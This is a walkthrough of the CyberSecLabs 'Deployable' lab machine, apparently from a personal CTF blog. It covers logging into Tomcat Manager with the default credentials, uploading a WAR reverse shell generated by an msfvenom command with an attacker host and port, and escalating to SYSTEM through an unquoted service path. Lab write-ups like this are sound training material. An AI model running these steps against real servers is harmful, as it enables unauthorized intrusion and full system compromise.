---
layout: page
title: Deployable - CyberSecLabs
permalink: /posts/ctf/cyberseclabs/deployable.html
---

# Deployable - CyberSecLabs
----


First things first, lets run our nmap scan.  I use a custom script that scans for ports then passes those open ports to nmap for service enumeration, however you can achieve the same results with the below command.

`nmap -p- -A 172.31.1.13`

![image](https://user-images.githubusercontent.com/50459517/104624925-c3ae7300-5659-11eb-8b7a-913c4d5ae7d8.png)

Quite a few ports to look at.  First thing that I see that catches my eye is Tomcat running on port 8080.  Lets check this out and see what we find.

![image](https://user-images.githubusercontent.com/50459517/104624961-cf9a3500-5659-11eb-9ac9-d00a9418d094.png)

Looks like we have a default page with some information disclosure on the version of Tomcat running.  I looked for any vulnerabilities for Tomcat 7.0.88 and found a couple of possibilities but couldn't get them to work so I put them on the back burner.  I decided to fuzz for directories which didn't returned much but it did return a few results as we can see here.

![image](https://user-images.githubusercontent.com/50459517/104625488-68c94b80-565a-11eb-9d23-1c19f7fa95c5.png)

The manager directory looks interesting, lets check that out.

![image](https://user-images.githubusercontent.com/50459517/104625535-77affe00-565a-11eb-8073-21be0df27572.png)

We have a place to log in,  I tried a few common creds like admin:admin with no luck.  I then searched for tomcat default creds and for this list on GitHub

https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown

If we go through this list, we will find that the default creds of **tomcat:s3cret** work and we are now logged into the manager.

![image](https://user-images.githubusercontent.com/50459517/104625685-a037f800-565a-11eb-8b3f-284e9334f038.png)

If we scroll down, we see a place to upload a **.war** file.  This is perfect as we should be able to upload a malicious war file that can get us a shell on the machine.  Lets generate one with **msfvenom**

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.0.11 LPORT=1337 -f war > shell.war`

![image](https://user-images.githubusercontent.com/50459517/104625723-aaf28d00-565a-11eb-95ff-5008293a690b.png)

Once we upload our file to the server we will see it under Applications

![image](https://user-images.githubusercontent.com/50459517/104625743-b3e35e80-565a-11eb-82c0-6cf2768c9978.png)

Now we just need to start a netcat listener and click on the application to execute on the server.

![image](https://user-images.githubusercontent.com/50459517/104625776-be9df380-565a-11eb-8af3-ff0a2f1c15c4.png)

We now have a shell!  Now lets see if we can escalate our privileges.

I started with transferring over **WinPEAS** to the machine and found an unquoted service path that we may be able to abuse.  We can also see that we have access to create files in a directory within the path of this service executable.

![image](https://user-images.githubusercontent.com/50459517/104625828-ce1d3c80-565a-11eb-932b-42876bb97bf2.png)

![image](https://user-images.githubusercontent.com/50459517/104625885-dbd2c200-565a-11eb-86d5-a5f7718796e2.png)

We can query more information about this service with **sc qc Deploy**

![image](https://user-images.githubusercontent.com/50459517/104625924-e5f4c080-565a-11eb-9589-ea723e0688b9.png)

As we can see, this services seems to be running with system permissions.  Since we can see from the WinPEAS output that we can write to the **C:\Program Files\Deploy Ready** directory, we should be able to create a malicious file called **Service.exe** within this directory.

![image](https://user-images.githubusercontent.com/50459517/104625955-eee59200-565a-11eb-90f9-dbc1a32094d3.png)

Now we can execute this file by starting the service with **net start Deploy** and obtain a shell as system

![image](https://user-images.githubusercontent.com/50459517/104625980-f86efa00-565a-11eb-9abb-06f105ec3143.png)
